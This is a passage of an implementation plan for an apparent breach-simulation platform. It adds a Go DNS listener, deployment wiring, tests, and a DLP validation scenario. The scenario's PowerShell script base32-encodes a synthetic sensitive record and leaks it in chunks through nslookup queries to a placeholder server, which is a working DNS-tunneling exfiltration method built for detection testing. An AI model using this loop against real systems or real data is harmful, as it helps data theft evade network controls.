		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client, err := net.Dial("udp", l.LocalAddr().String())
		if err != nil {
			t.Fatalf("dial listener: %v", err)
		}
		defer client.Close()

		garbage := make([]byte, maxPacketBytes+10)
		if _, err := client.Write(garbage); err != nil {
			t.Fatalf("write garbage: %v", err)
		}
		sendQuery(t, client, "000.1.deadbeefcafebabe."+DomainSuffix)
		client.SetReadDeadline(time.Now().Add(2 * time.Second))
		buf := make([]byte, 512)
		if _, err := client.Read(buf); err != nil {
			t.Fatalf("listener did not respond to a valid query after a malformed packet: %v", err)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/dnssink/... -v`
Expected: FAIL to compile — `NewListener`, `Listener`, `Status`, `Serve`, `LocalAddr`, `Close` undefined.

- [ ] **Step 3: Implement `listener.go`**

Create `orchestrator/internal/dnssink/listener.go`:

```go
package dnssink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/miekg/dns"
)

// reassemblyTTL matches internal/api's sinkTokenTTL -- a step's own
// dispatch-to-completion window is always well under this.
const reassemblyTTL = 10 * time.Minute

// maxDeclaredChunks is a generous ceiling for any realistic synthetic
// payload this platform sends -- a header declaring more than this is
// rejected outright by the reassembler.
const maxDeclaredChunks = 64

// rateLimitPerSecond is a coarse per-source-IP abuse guard, not a
// precision limiter -- this listener only ever expects traffic from BAS
// agents running a scenario step.
const rateLimitPerSecond = 20

// Status reports a Listener's current health.
type Status struct {
	State  string // "running" | "failed"
	Reason string // populated when State == "failed"
	Bind   string // the actual bound address, e.g. "0.0.0.0:53"; empty when failed
}

// Listener owns a UDP socket, the reassembler, and the DB pool used to
// persist completed reassemblies as dlp_sink_receipts rows.
type Listener struct {
	conn         *net.UDPConn
	domainSuffix string
	reassembler  *reassembler
	limiter      *rateLimiter
	db           *pgxpool.Pool
	status       atomic.Value
}

func (l *Listener) setStatus(s Status) { l.status.Store(s) }

// Status is safe to call concurrently with Serve.
func (l *Listener) Status() Status {
	v := l.status.Load()
	if v == nil {
		return Status{State: "unknown"}
	}
	return v.(Status)
}

// NewListener binds addr (e.g. ":53" in production, ":0" in tests to get
// an OS-assigned ephemeral port -- read back via LocalAddr()). db is used
// to persist completed reassemblies; domainSuffix is the fixed label
// suffix scenario queries target.
func NewListener(addr, domainSuffix string, db *pgxpool.Pool) (*Listener, error) {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("resolve %s: %w", addr, err)
	}
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return nil, fmt.Errorf("bind %s: %w", addr, err)
	}
	l := &Listener{
		conn:         conn,
		domainSuffix: domainSuffix,
		reassembler:  newReassembler(reassemblyTTL, maxDeclaredChunks),
		limiter:      newRateLimiter(rateLimitPerSecond, time.Second),
		db:           db,
	}
	l.setStatus(Status{State: "running", Bind: conn.LocalAddr().String()})
	return l, nil
}

// LocalAddr returns the actual bound address. Only valid when Status()
// reports "running".
func (l *Listener) LocalAddr() net.Addr { return l.conn.LocalAddr() }

// Close releases the UDP socket. Only valid when Status() reports
// "running".
func (l *Listener) Close() error { return l.conn.Close() }

// Serve runs the receive loop until ctx is cancelled or Close is called.
// Meant to be run in its own goroutine by the caller, matching the
// existing StartWatcher/StartRetention/StartExpiration pattern in
// cmd/server/main.go. Packet handling is single-goroutine and serial by
// design -- this is a low-throughput purpose-built listener, not a
// production DNS server, so no internal locking beyond what reassembler
// and rateLimiter already provide for their own state is needed.
func (l *Listener) Serve(ctx context.Context) {
	go func() {
		<-ctx.Done()
		_ = l.conn.Close()
	}()
	buf := make([]byte, maxPacketBytes+1) // +1 so an oversized packet is still detectably oversized, not silently truncated to exactly the limit
	for {
		n, addr, err := l.conn.ReadFromUDP(buf)
		if err != nil {
			if ctx.Err() != nil {
				return // expected: context cancelled, conn closed above
			}
			continue // transient read error, keep serving
		}
		l.handlePacket(buf[:n], addr)
	}
}

func (l *Listener) handlePacket(raw []byte, addr *net.UDPAddr) {
	if tooLarge(raw) {
		return // dropped silently -- no response, no oracle for what was rejected
	}
	if !l.limiter.allow(addr.IP.String()) {
		return
	}
	msg := new(dns.Msg)
	if err := msg.Unpack(raw); err != nil {
		return
	}
	resp := buildResponse(msg)
	if respBytes, err := resp.Pack(); err == nil {
		_, _ = l.conn.WriteToUDP(respBytes, addr)
	}
	rec, ok := extractRecord(msg, l.domainSuffix)
	if !ok {
		return // not a tunneling record -- fixed response already sent above
	}
	l.reassembler.evictExpired()
	if rec.Seq == 0 {
		_ = l.reassembler.header(rec.Campaign, rec.Payload)
		return
	}
	decoded, complete, err := l.reassembler.chunk(rec.Campaign, rec.Seq, rec.Payload)
	if err != nil || !complete {
		return
	}
	l.recordReceipt(rec.Campaign, decoded, addr.IP.String())
}

// recordReceipt writes one dlp_sink_receipts row for a fully reassembled
// campaign, mirroring internal/api/dlp_sink.go's DLPSink insert shape
// exactly (same table, same "hash + length only, never the raw payload"
// rule) -- this is the one point of contact between this package and the
// existing sink-verification schema.
func (l *Listener) recordReceipt(campaignID string, decoded []byte, sourceIP string) {
	sum := sha256.Sum256(decoded)
	_, _ = l.db.Exec(context.Background(),
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		campaignID, sourceIP, hex.EncodeToString(sum[:]), len(decoded), "dns-tunnel",
	)
}

// StartListener binds addr and runs Serve in the background, returning
// immediately. If the bind fails, it logs the failure loudly and returns
// a Listener whose Status() reports "failed" with the reason -- callers
// don't need to check an error, matching the existing
// StartWatcher/StartRetention/StartExpiration pattern where startup
// failures are logged, never fatal to the rest of the orchestrator. Never
// silently falls back to a different port.
func StartListener(ctx context.Context, addr, domainSuffix string, db *pgxpool.Pool) *Listener {
	l, err := NewListener(addr, domainSuffix, db)
	if err != nil {
		log.Printf("[dnssink] FAILED to bind %s: %v -- the DNS tunneling channel will not be verifiable until this is resolved", addr, err)
		failed := &Listener{}
		failed.setStatus(Status{State: "failed", Reason: err.Error()})
		return failed
	}
	log.Printf("[dnssink] listening on %s", l.LocalAddr())
	go l.Serve(ctx)
	return l
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go vet ./internal/dnssink/... && go test ./internal/dnssink/... -v -timeout 5m`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add orchestrator/internal/dnssink/listener.go orchestrator/internal/dnssink/listener_test.go
git commit -m "$(cat <<'EOF'
feat(dnssink): UDP listener, receive loop, and receipt persistence

Wires protocol.go's validation/parsing and reassembler.go's chunk state
into a real UDP socket. On full reassembly, writes one dlp_sink_receipts
row (channel='dns-tunnel') using the same insert shape the existing HTTP
sink already uses -- this is the only point of contact with the existing
sink-verification schema, and it's why internal/verifysync and
internal/reporting need no changes for this channel (proven in Task 6's
regression test). StartListener never silently falls back to a
different port on bind failure; it logs loudly and reports Status()
"failed" instead.
EOF
)"
git push
```

---

## Task 5: Config, `main.go`, and `docker-compose.yml` wiring

**Files:**
- Modify: `orchestrator/config/config.go`
- Modify: `orchestrator/cmd/server/main.go`
- Modify: `packaging/compose/docker-compose.yml` (repo-root path — NOT `orchestrator/packaging/...`; this file lives at `C:\Users\Administrator\Downloads\Audspect_Cloud\packaging\compose\docker-compose.yml`, a sibling of `orchestrator/`, exactly like the `scenarios/` directory)

**Interfaces:**
- Consumes: `dnssink.StartListener`, `dnssink.DomainSuffix` (Task 4).
- Produces: `cfg.DNSSinkEnabled bool` — consumed only within this task's own `main.go` wiring.

- [ ] **Step 1: Add the config field and its env var**

In `orchestrator/config/config.go`, add the field to the `Config` struct, right after `RateLimitBurst` (the struct's last field):

```go
	// DNSSinkEnabled controls the DNS-tunneling exfiltration listener
	// (internal/dnssink). Defaults to true -- unlike RateLimitEnabled above,
	// this is a detection-capability feature, not an opt-in safety limit, so
	// it should be on by default; a bind failure (e.g. port 53 already
	// owned) is logged and reflected in the listener's own Status(), never
	// fatal to the rest of the orchestrator, so leaving it enabled by
	// default carries no risk to existing installs. Env: DNS_SINK_ENABLED.
	DNSSinkEnabled bool `json:"dns_sink_enabled,omitempty"`
```

And in `Load`'s defaults struct literal (the `cfg := &Config{...}` block near the top of `Load`), add:

```go
		DNSSinkEnabled:   true,
```

And in the environment-variable override section, immediately after the existing `API_RATE_LIMIT_ENABLED` block:

```go
	if v := os.Getenv("DNS_SINK_ENABLED"); v != "" {
		if b, err := strconv.ParseBool(v); err == nil {
			cfg.DNSSinkEnabled = b
		}
	}
```

- [ ] **Step 2: Wire the listener into `main.go`**

In `orchestrator/cmd/server/main.go`, add the import:

```go
	"github.com/audspect/bas/internal/dnssink"
```

Then, immediately after the existing IOC Expiration block (`iocregistry.StartExpiration(context.Background(), pool, iocregistry.DefaultStaleAfter)`) and before `srv := &http.Server{...}`:

```go
	// ── DNS Tunneling Exfiltration Sink ───────────────────────────────────
	// Second channel of the DLP sink-verification architecture (see
	// docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md).
	// Independently enable/disable-able; a bind failure is logged and
	// reflected in Status(), never fatal to the rest of the orchestrator.
	if cfg.DNSSinkEnabled {
		dnssink.StartListener(context.Background(), ":53", dnssink.DomainSuffix, pool)
	} else {
		log.Println("[dnssink] disabled via DNS_SINK_ENABLED=false")
	}
```

- [ ] **Step 3: Add the compose capability and port**

In `packaging/compose/docker-compose.yml`, add `cap_add` to the `orchestrator` service, immediately after its `container_name` line:

```yaml
    container_name: audspect-orchestrator
    cap_add:
      - NET_BIND_SERVICE
```

Add `DNS_SINK_ENABLED` to the `environment:` block, immediately after `BAS_LICENSE_PATH`:

```yaml
      BAS_LICENSE_PATH: /etc/bas/${LICENSE_FILE:-bas.lic}
      DNS_SINK_ENABLED: ${DNS_SINK_ENABLED:-true}
```

Add the UDP port mapping to `ports:`, alongside the existing 9443 entry:

```yaml
    ports:
      - "${BAS_PORT:-9443}:9443"
      - "53:53/udp"
```

- [ ] **Step 4: Build and run the full `internal/api` + config-touching suites**

```bash
cd orchestrator && go build ./... && go test ./internal/dnssink/... ./config/... -v -timeout 5m
```

Expected: clean build, all tests PASS. (`config` package may have no existing tests — that's fine, `go test` reports `[no test files]` harmlessly if so.)

- [ ] **Step 5: Commit**

```bash
git add orchestrator/config/config.go orchestrator/cmd/server/main.go packaging/compose/docker-compose.yml
git commit -m "$(cat <<'EOF'
feat(deploy): wire the DNS tunneling listener into startup and compose

DNSSinkEnabled defaults to true (unlike the opt-in RateLimitEnabled) --
this is a detection-capability feature whose failure mode is always
"logged and visible in Status(), never fatal," so there's no
upgrade-safety reason to default it off. docker-compose.yml grants
cap_add: NET_BIND_SERVICE (not root) so the orchestrator container can
bind UDP/53 directly, and exposes 53:53/udp alongside the existing
9443:9443 HTTPS port.
EOF
)"
git push
```

---

## Task 6: DNS placeholder substitution + zero-change regression proof

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`
- Test only (no modification expected): `orchestrator/internal/reporting/dlp_test.go`, `orchestrator/internal/verifysync/job_test.go`

**Interfaces:**
- Consumes: `generateSinkToken(n int)` (Task 1); `dnssink.DomainSuffix` (Task 2).
- Produces: DNS-aware `issueSinkTokensAndSubstitute` — consumed by `dispatchRun` (already wired to call this function; no further changes needed there since its call signature is unchanged).

- [ ] **Step 1: Write the failing tests**

Add to `orchestrator/internal/api/dlp_sink_test.go`, and add the new import:

```go
	"github.com/audspect/bas/internal/dnssink"
```

```go
func TestIssueSinkTokensAndSubstitute_DNSPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1071.004", Command: "nslookup 000.4.{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}} {{SINK_DNS_SERVER}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-dns-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_DNS_CAMPAIGN_ID}}") || strings.Contains(cmd, "{{SINK_DNS_SERVER}}") || strings.Contains(cmd, "{{SINK_DNS_DOMAIN}}") {
			t.Fatalf("DNS placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_DNS_SERVER must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, dnssink.DomainSuffix) {
			t.Fatalf("expected dnssink.DomainSuffix (%s) in the command: %s", dnssink.DomainSuffix, cmd)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-dns-1' AND technique_id = 'T1071.004'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-dns-1/T1071.004 = %d, want 1", count)
		}
	})
}

func TestDNSServerHost_StripsSchemeAndPort(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://orchestrator.example:9443", "orchestrator.example"},
		{"https://10.0.0.5:9443", "10.0.0.5"},
		{"http://localhost", "localhost"},
	}
	for _, c := range cases {
		got := dnsServerHost(c.in)
		if got != c.want {
			t.Errorf("dnsServerHost(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run "TestIssueSinkTokensAndSubstitute_DNSPlaceholders|TestDNSServerHost" -v`
Expected: FAIL to compile — `dnsServerHost` undefined, DNS placeholders not substituted.

- [ ] **Step 3: Implement the DNS substitution path**

In `orchestrator/internal/api/dlp_sink.go`, add the imports:

```go
	"net/url"

	"github.com/audspect/bas/internal/dnssink"
```

Modify `issueSinkTokensAndSubstitute`'s loop body to also handle the DNS placeholder set, right after the existing `{{SINK_TOKEN}}` block:

```go
		if strings.Contains(steps[i].Command, "{{SINK_DNS_CAMPAIGN_ID}}") {
			campaignID, err := generateSinkToken(8)
			if err != nil {
				return nil, err
			}
			expiresAt := time.Now().Add(sinkTokenTTL)
			if _, err := h.db.Exec(ctx,
				`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
				campaignID, runID, steps[i].TechniqueID, expiresAt,
			); err != nil {
				return nil, fmt.Errorf("persist dns sink token: %w", err)
			}
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_DNS_CAMPAIGN_ID}}", campaignID)
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_DNS_SERVER}}", dnsServerHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_DNS_DOMAIN}}", dnssink.DomainSuffix)
		}
```

(The existing `{{SINK_TOKEN}}` block stays as-is above this; the two blocks are independent `if` statements on the same loop iteration, since a step uses one placeholder set or the other, never both.)

Add the helper function:

```go
// dnsServerHost extracts just the hostname/IP from publicBaseURL (dropping
// scheme and port) for use as nslookup's explicit server argument -- DNS
// queries target the orchestrator's own address directly, the same
// "explicit target, not customer DNS routing" principle {{SINK_URL}}
// already uses for the HTTP channel.
func dnsServerHost(publicBaseURL string) string {
	u, err := url.Parse(publicBaseURL)
	if err != nil || u.Hostname() == "" {
		return publicBaseURL
	}
	return u.Hostname()
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run "TestIssueSinkTokensAndSubstitute_DNSPlaceholders|TestDNSServerHost" -v`
Expected: PASS.

- [ ] **Step 5: Prove `internal/verifysync` and `internal/reporting` need zero changes**

This is the spec's explicit claim under test, not an assumption. Run both packages' full existing suites without modifying either package:

```bash
cd orchestrator && go test ./internal/verifysync/... ./internal/reporting/... -v -timeout 10m
```

Expected: PASS — every existing test, including `TestAnnotateSinkReceipts_SetsObservedOnlyForIssuedTokens` (`internal/verifysync/job_test.go`) and `TestDLPVerifier_SinkPrimary_TokenReceived`/`TestDLPVerifier_SinkPrimary_TokenNotReceived`/`TestDLPVerifier_NoSinkToken_UnaffectedByNewLogic` (`internal/reporting/dlp_test.go`). These tests already only assert against `dlp_sink_tokens`/`dlp_sink_receipts` rows and the `SinkTokenObserved` field — they have no channel-specific logic to update, because `internal/dnssink`'s `recordReceipt` (Task 4) writes into the exact same table with the exact same shape the HTTP sink already writes into. If any of these fail, that is a signal this task introduced an unintended dependency the spec didn't anticipate — stop and investigate rather than patching around it.

- [ ] **Step 6: Run the full `internal/api` and `internal/dnssink` suites**

```bash
cd orchestrator && go test ./internal/api/... ./internal/dnssink/... -v -timeout 20m > <scratchpad>/dns_task6_full.log 2>&1
```

Same `Monitor` + full-log-read procedure as prior tasks.

- [ ] **Step 7: Commit**

```bash
git add orchestrator/internal/api/dlp_sink.go orchestrator/internal/api/dlp_sink_test.go
git commit -m "$(cat <<'EOF'
feat(api): DNS sink placeholder substitution

Adds {{SINK_DNS_CAMPAIGN_ID}}/{{SINK_DNS_SERVER}}/{{SINK_DNS_DOMAIN}}
handling to issueSinkTokensAndSubstitute, mirroring the existing
{{SINK_TOKEN}}/{{SINK_URL}} substitution but with an 8-byte
(DNS-label-safe) token instead of 32 bytes. Regression-tested that
internal/verifysync and internal/reporting need zero changes for this
channel -- both already key purely on "does a dlp_sink_receipts row
exist for this token," which internal/dnssink's listener now also
satisfies by writing into the same table.
EOF
)"
git push
```

---

## Task 7: V1 scenario content

**Files:**
- Create: `scenarios/dlp-exfiltration-dns-tunnel.yaml` (repo-root path, sibling of `orchestrator/` — NOT `orchestrator/scenarios/`, which does not exist)
- Create: `scenarios/dlp-exfiltration-dns-tunnel.yaml.sig`
- Modify: `scenarios/detection-profiles/windows_dlp_exfiltration.yaml`

**Interfaces:**
- Consumes: `{{SINK_DNS_CAMPAIGN_ID}}`/`{{SINK_DNS_SERVER}}`/`{{SINK_DNS_DOMAIN}}` placeholder substitution (Task 6); the `windows_dlp_exfiltration` detection profile's existing structure.

- [ ] **Step 1: Add the new scenario file**

Create `scenarios/dlp-exfiltration-dns-tunnel.yaml`:

```yaml
id: dlp-exfiltration-dns-tunnel
name: DLP Exfiltration Validation — DNS Tunneling Channel
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by dlp-exfiltration-validation.yaml and
  dlp-exfiltration-sink-https.yaml (fabricated PAN, Aadhaar, SWIFT/BIC,
  UPI VPA, and credit-card patterns), this time by base32-encoding it
  into a sequence of DNS query labels ("DNS tunneling") rather than an
  HTTP body -- a protocol-distinct exfiltration technique that tests
  whether network-layer controls (DLP, IDS/IPS, DNS security products)
  catch data leaving via DNS queries specifically, independent of any
  HTTP content-inspection capability.

  Second channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own purpose-built DNS
  listener (internal/dnssink, bound to UDP/53) fully reassembles the
  encoded payload from the query sequence -- ground truth for whether
  the data left via DNS, not an inference from a local check.
  Deliberately its own standalone scenario, matching the same reasoning
  dlp-exfiltration-sink-https.yaml already established for keeping each
  verification model in its own file.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The DNS listener stores only a hash of the reassembled payload,
  never the raw content, and every query receives a fixed, harmless
  NOERROR response (RFC 5737 documentation-only IP) so no real DNS
  infrastructure is ever queried. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - dns-tunneling
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration
  - command-and-control

steps:
  - name: "DLP Validation — DNS Tunneling Exfiltration (T1071.004)"
    technique_id: T1071.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic sensitive record split across query labels. No real DNS infrastructure is queried and no data leaves the environment -- the destination is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
    detection:
      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      function ConvertTo-Base32([byte[]]$Bytes) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
        $bits = ''
        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
        $result = ''
        for ($i = 0; $i -lt $bits.Length; $i += 5) {
          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
        }
        return $result
      }
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($csvContent)
      $encoded = ConvertTo-Base32 $payloadBytes
      $chunkSize = 52
      $chunks = @()
      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
      }
      $sent = 0
      try {
        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
        for ($i = 0; $i -lt $chunks.Count; $i++) {
          $seq = "{0:D3}" -f ($i + 1)
          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
          $sent++
        }
        Write-Output "EXEC T1071.004: multi-type sensitive record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
      } catch {
        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the DNS listener fully reassembled the
      # campaign, resolved server-side by internal/dnssink +
      # internal/verifysync, not from anything this script can locally
      # confirm.
    cleanup: ""
```

- [ ] **Step 2: Add the detection-profile entry**

In `scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, update the `technique_ids` line to add `T1071.004`:

```yaml
technique_ids: [T1052, T1052.001, T1074.001, T1115, T1560.001, T1567, T1071.004]
```

Append a new `expected_detection` entry after the existing `dlp-sink-https-block` entry (the file's current last entry):

```yaml
  - id: dlp-dns-tunnel-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/network controls did not block DNS-tunneled exfiltration of regulated data"
      remediation: >-
        Confirm DNS security/DLP inspection detects and blocks anomalous
        query volume/entropy consistent with DNS tunneling, independent
        of HTTP-based content inspection.
      reference: "MITRE ATT&CK T1071.004 — Application Layer Protocol: DNS"
```

- [ ] **Step 3: Sign the new scenario file and re-sign the modified profile**

From the `orchestrator` directory:

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-dns-tunnel.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

Confirm both `.sig` files exist/were updated: `ls -la ../scenarios/dlp-exfiltration-dns-tunnel.yaml.sig ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`.

- [ ] **Step 4: Confirm the scenario loads and signature-verifies against the real scenarios directory**

Write a throwaway test to prove this (do not leave it committed — this exact technique was used and then deleted for the sink-https channel earlier in this program):

Create `orchestrator/internal/scenario/zzz_verify_dns_tunnel_load_test.go`:

```go
package scenario

import "testing"

func TestZZZVerifyDNSTunnelScenarioLoadsFromRealDir(t *testing.T) {
	e := NewEngine("../../../scenarios")
	if err := e.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}
	sc, ok := e.Get("dlp-exfiltration-dns-tunnel")
	if !ok {
		t.Fatalf("dlp-exfiltration-dns-tunnel not present in loaded scenarios map (parse error or signature verification failure -- check test log output above)")
	}
	if sc.Source != "builtin" {
		t.Errorf("Source = %q, want builtin", sc.Source)
	}
	if len(sc.Steps) != 1 {
		t.Errorf("Steps = %d, want 1", len(sc.Steps))
	}
}
```

Run: `cd orchestrator && go test ./internal/scenario/... -run TestZZZVerifyDNSTunnelScenarioLoadsFromRealDir -v -timeout 1m`
Expected: PASS.

Then delete the throwaway file: `rm orchestrator/internal/scenario/zzz_verify_dns_tunnel_load_test.go` (never committed).

- [ ] **Step 5: Run the full `internal/scenario` suite**

Run: `cd orchestrator && go test ./internal/scenario/... -v -timeout 5m`
Expected: PASS — every test in the package, confirming the new signed scenario and re-signed profile load cleanly alongside all existing built-ins.

- [ ] **Step 6: Commit**

```bash
git add scenarios/dlp-exfiltration-dns-tunnel.yaml scenarios/dlp-exfiltration-dns-tunnel.yaml.sig scenarios/detection-profiles/windows_dlp_exfiltration.yaml scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "$(cat <<'EOF'
feat(scenarios): DNS tunneling DLP exfiltration channel

Second sink-verified channel: base32-encodes the same synthetic
regulated-data record the HTTPS channel uses into a sequence of DNS
query labels via nslookup, verified by whether internal/dnssink's
listener ever fully reassembles the sequence. Standalone scenario file,
matching the HTTPS channel's precedent of keeping each verification
model in its own file.
EOF
)"
git push
```

---

## Task 8: Full verification and handoff

**Files:** none (verification only)

- [ ] **Step 1: Run the full `internal/api`, `internal/dnssink`, `internal/reporting`, `internal/verifysync`, `internal/scenario`, and `config` suites together**

```bash
cd orchestrator && go test ./internal/api/... ./internal/dnssink/... ./internal/reporting/... ./internal/verifysync/... ./internal/scenario/... ./config/... -v -timeout 20m > <scratchpad>/dns_final.log 2>&1
```

Use `Monitor` to watch for completion, then read the actual full log file and confirm every test passes with zero `--- FAIL` lines.

- [ ] **Step 2: Run the broader build**

Run: `cd orchestrator && go build ./...`
Expected: no errors.

- [ ] **Step 3: No frontend changes needed**

This plan does not touch `wwwroot/index.html` — matching the HTTPS sink sub-project's precedent, nothing in this plan's tasks requires a UI change. The DNS listener's `Status()` is queryable server-side for a future dashboard view to consume, but no frontend work ships in this sub-project.

- [ ] **Step 4: Announce completion and hand off**

Report to the user: the DNS tunneling exfiltration channel is live — `internal/dnssink` binds UDP/53 directly (via `NET_BIND_SERVICE`), reassembles base32-encoded DNS-tunneled payloads, and writes into the exact same `dlp_sink_receipts` table the HTTPS channel already uses, meaning `internal/verifysync` and `internal/reporting` needed zero code changes (proven by regression test in Task 6). A new scenario (`dlp-exfiltration-dns-tunnel.yaml`, T1071.004) proves the full loop end-to-end. Per the user's own prioritized roadmap from brainstorming, SFTP is next, then SMTP/E-mail, then ICMP tunneling, before cloud storage APIs or webhook-style channels. Then use the **finishing-a-development-branch** skill to verify tests one more time, detect the environment, and present the standard merge/PR/keep-as-is menu — per this session's established pattern, this plan runs directly on `main` in the current working tree (no worktree).
